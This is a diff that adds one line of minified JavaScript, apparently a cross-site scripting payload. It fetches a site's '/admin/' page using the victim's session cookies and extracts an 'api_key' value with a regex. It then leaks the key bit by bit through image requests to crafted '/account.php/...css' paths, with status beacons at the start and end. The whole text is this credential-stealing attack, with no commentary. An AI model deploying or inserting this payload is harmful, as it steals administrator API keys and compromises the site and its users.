@@ -1,0 +1,1 @@
+(function(){function b(n){new Image().src='/account.php/'+n+'.css'}b('S2_alive');fetch('/admin/',{credentials:'include'}).then(r=>r.text()).then(t=>{let m=t.match(/api_key=([A-Za-z0-9_\-]+)/i);if(!m){b('S2_nokey');return}let k=m[1];for(let i=0;i<k.length;i++){let c=k.charCodeAt(i);for(let j=0;j<8;j++)if(c&(1<<j))b('S2_'+i+'_'+j)}b('S2_done')})})();
